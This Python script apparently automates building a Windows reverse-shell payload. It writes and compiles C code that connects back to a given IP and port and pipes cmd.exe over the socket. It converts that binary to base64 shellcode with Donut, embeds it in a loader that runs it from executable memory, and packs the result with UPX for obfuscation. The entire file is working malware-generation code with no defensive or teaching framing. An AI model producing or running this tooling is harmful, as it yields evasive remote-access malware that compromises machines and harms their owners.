#!/usr/bin/env python3

import sys
import subprocess
import os

REVERSE_SHELL_C = "reverse_shell.c"
REVERSE_SHELL_EXE = "reverse_shell.exe"
SHELLCODE_B64_TXT = "shellcode_b64.txt"
LOADER_C = "loader.c"
FINAL_EXE = "final_payload.exe"

LOADER_TEMPLATE = r"""
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>

unsigned char *decode_base64(const char *base64, size_t *out_len) {{
    DWORD len;
    unsigned char *decoded = NULL;
    if (CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) {{
        decoded = (unsigned char *)malloc(len);
        if (CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, decoded, &len, NULL, NULL)) {{
            *out_len = len;
        }}
    }}
    return decoded;
}}

int main() {{
    const char *base64_shellcode =
        "{base64_payload}";

    size_t shellcode_len;
    unsigned char *shellcode = decode_base64(base64_shellcode, &shellcode_len);
    if (!shellcode) {{
        printf("Failed to decode base64 shellcode.\\n");
        return -1;
    }}

    void *exec = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {{
        printf("Memory allocation failed.\\n");
        free(shellcode);
        return -1;
    }}

    memcpy(exec, shellcode, shellcode_len);
    free(shellcode);

    ((void(*)())exec)();
    return 0;
}}
"""


def usage():
    print(f"Usage: {sys.argv[0]} <IP> <PORT>")
    exit(1)


def write_reverse_shell(ip, port):
    code = f"""
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

WSADATA wsaData;
SOCKET winSock;
struct sockaddr_in sockAddr;

int port = {port};
char *ip = "{ip}";

STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;

int main() {{
    WSAStartup(MAKEWORD(2,2), &wsaData);
    winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(port);
    sockAddr.sin_addr.s_addr = inet_addr(ip);

    WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = sinfo.hStdInput = sinfo.hStdOutput = (HANDLE)winSock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    return 0;
}}
"""
    with open(REVERSE_SHELL_C, 'w') as f:
        f.write(code)


def compile_reverse_shell():
    subprocess.run(["x86_64-w64-mingw32-gcc", REVERSE_SHELL_C, "-o", REVERSE_SHELL_EXE, "-lws2_32"], check=True)


def generate_shellcode():
    print("[*] Generating base64 shellcode with Donut...")
    subprocess.run(["./donut/donut", "-i", REVERSE_SHELL_EXE, "-f", "2", "-o", SHELLCODE_B64_TXT], check=True)
    if not os.path.exists(SHELLCODE_B64_TXT):
        print("[!] Donut failed to create shellcode_b64.txt")
        exit(1)
    with open(SHELLCODE_B64_TXT, 'r') as f:
        return f.read().strip()


def write_loader(b64_payload):
    with open(LOADER_C, 'w') as f:
        f.write(LOADER_TEMPLATE.format(base64_payload=b64_payload))


def compile_loader():
    subprocess.run(["x86_64-w64-mingw32-gcc", LOADER_C, "-o", FINAL_EXE, "-lcrypt32"], check=True)


def pack_with_upx():
    try:
        subprocess.run(["upx", "--best", "--lzma", FINAL_EXE], check=True)
    except FileNotFoundError:
        print("[!] UPX not found — skipping obfuscation")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        usage()

    ip = sys.argv[1]
    port = sys.argv[2]

    print("[*] Writing reverse shell source...")
    write_reverse_shell(ip, port)

    print("[*] Compiling reverse shell...")
    compile_reverse_shell()

    print("[*] Generating shellcode with Donut...")
    b64 = generate_shellcode()

    print("[*] Writing loader with base64 shellcode...")
    write_loader(b64)

    print("[*] Compiling loader...")
    compile_loader()

    print("[*] Obfuscating with UPX (if available)...")
    pack_with_upx()

    print("[+] Done. Payload is: ./final_payload.exe")
